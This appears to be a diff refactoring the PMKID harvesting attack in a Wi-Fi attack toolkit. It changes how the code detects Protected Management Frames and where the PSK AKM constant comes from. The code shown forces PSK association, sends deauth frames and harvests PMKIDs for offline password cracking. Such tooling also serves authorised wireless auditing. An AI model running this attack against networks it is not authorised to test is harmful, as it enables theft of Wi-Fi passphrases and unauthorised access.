@@ -31,9 +31,10 @@ import time
 from typing import Optional
 
 from wifit3.models import AccessPoint
-from wifit3.models.access_point import deauth_protected
 from wifit3.dot11 import build_deauth, mac_to_str, random_client_mac, str_to_mac
 from wifit3.dot11.ie import force_psk_akm, GENERIC_RSN_IE
+from wifit3.dot11.pmf import PmfPosture
+from wifit3.dot11.rsn import AKM_PSK
 
 from .campaign import Campaign
 from .auth_assoc import Association
@@ -50,10 +51,9 @@ class PmkidFail(enum.Enum):
     NO_RESPONSE = "no_response"     # never got an M1 (AP stayed silent)
 
 
-_AKM_PSK = 0x02                  # 00-0F-AC:2 (PSK).
 # Only plain PSK: the active harvester forces AKM=PSK and stops at M1, so it yields the HMAC-SHA1
 # PMKID alone. (FT-PSK/PSK-SHA256 PMKIDs also crack but need an M2; see crack.handshake.crackable_pmkid_akm.)
-_HARVESTABLE_AKMS = (_AKM_PSK,)
+_HARVESTABLE_AKMS = (AKM_PSK,)
 
 
 class PmkidHarvestAttack(Campaign):
@@ -156,11 +156,13 @@ class PmkidHarvestAttack(Campaign):
         """Try up to ``self.attempts`` association rounds."""
         self.fail_reason = None
 
-        protection = deauth_protected(self.target)
-        if protection is not False:
-            self.fail_reason = (PmkidFail.PMF_REQUIRED if protection is True
-                                else PmkidFail.PMF_INVALID)
-            logger.info("[PMKID] %s has required or invalid PMF, skipping.", self.target.bssid)
+        posture = self.target.pmf_posture
+        if posture is PmfPosture.REQUIRED:
+            self.fail_reason = PmkidFail.PMF_REQUIRED
+        elif posture is PmfPosture.INVALID:
+            self.fail_reason = PmkidFail.PMF_INVALID
+        if self.fail_reason is not None:
+            logger.info("[PMKID] %s has %s PMF, skipping.", self.target.bssid, posture)
             return
 
         # Force a single AKM = PSK in our Assoc IE
@@ -214,7 +216,7 @@ class PmkidHarvestAttack(Campaign):
                             await self._send_leaving_deauth()
                             if hs.pmkid:
                                 if hs.pmkid_akm is None:
-                                    hs.pmkid_akm = _AKM_PSK   # we negotiated PSK in our Assoc
+                                    hs.pmkid_akm = AKM_PSK    # we negotiated PSK in our Assoc
                                 logger.info(
                                     f"[PMKID] Harvested {hs.pmkid.hex()} from {self.target.bssid} "
                                     f"(STA {mac_to_str(self.source_mac)})"
